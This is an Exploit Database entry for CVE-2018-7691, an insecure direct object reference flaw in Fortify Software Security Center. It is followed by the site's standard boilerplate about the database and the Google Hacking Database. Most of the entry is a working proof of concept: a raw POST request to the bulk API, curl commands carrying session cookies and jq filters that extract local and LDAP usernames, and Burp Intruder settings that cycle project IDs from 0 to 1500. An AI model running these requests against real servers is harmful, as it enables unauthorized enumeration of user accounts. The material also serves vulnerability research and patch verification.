**Vulnerable App:**

```
Details
================
Software: Fortify SSC (Software Security Center)
Version: 17.10, 17.20 & 18.10
Homepage: https://www.microfocus.com
Advisory report: https://github.com/alt3kx/CVE-2018-7691
CVE: CVE-2018-7691
CVSS: 6.5 (Medium; AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE-639

Description
================
REST API contains Insecure direct object references (IDOR) allowing and extracting arbitrary details of the Local and LDAP users via POST method

Vulnerability
================
Fortify SSC (Software Security Center) 17.10, does not properly check ownership of "authEntities", which allows remote authenticated (view-only) users
to read arbitrary details via API bulk parameter to /api/v1/projectVersions/{NUMBER}/authEntities

Note: View-only Role, is a restricted role, can view results, but cannot interfere with the issue triage or the remediation process.

Proof of concept
================

Pre-requisites:

- Curl command deployed (Windows or Linux)
- jq command deployed (for parsing JSON fields), (Windows or Linux)
- Burpsuite Free/Por deployed or any other Proxy to catch/send the request (optional)

Step (1): LogOn into fortifyserver.com SSC (Software Security Center) 17.10 with your view-only role (restricted),

The URL normally is avaiable as following:

Target: https://fortifyserver.com/ssc/#/

Step (2): Once logged extract the Cookie field, the format normally as following: "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
Step (3): Start BurpSuite Free/Pro or any other HTTP proxy (optional) listen port 8080 as default

Step (4): The offending POST is:

POST /ssc/api/v1/bulk HTTP/1.1
Host: fortifyserver.com
Connection: close
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;
Content-Length: 123

{"requests":[{"uri":"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities","httpVerb":"GET"}]}\x0d\x0a

Step (5): Test the first POST (to be included the cookie session) request and parsing the JSON data received using curl and jq commands as following:

# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "Accept: application/json, text/plain, */*"
-H "X-Requested-With: XMLHttpRequest"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Content-Type: application/json;charset=UTF-8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/0/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .responseCode'

You should see the following response:

200

Step (6): Now extract all local and LDAP users registered into Fortify SSC server:

Payload:  /api/v1/projectVersions/{NUMBER}/authEntities, see the field "--data-binary" below and change the number as following:

# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "Accept: application/json, text/plain, */*"
-H "X-Requested-With: XMLHttpRequest"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Content-Type: application/json;charset=UTF-8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .data[] .entityName'

You should see the following response with users available

"admin"
"sca"
"alex"

[../snip]

Step (7): Automate with BurpSuite Pro/Free choose:

Payload Positions: "Intruder Tab -> Positions" highlight as following:

-> /api/v1/projectVersions/§1§/authEntities

Payloads set: "Intruder Tab -> Payloads" with the following data:

-> Payload set: 1

-> Payload type: Numbers

Payload Options [Numbers]:

-> Type: Sequential

-> From: 0

-> To: 1500

-> Step: 1

Then start attack…
Have fun!

Have fun!

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
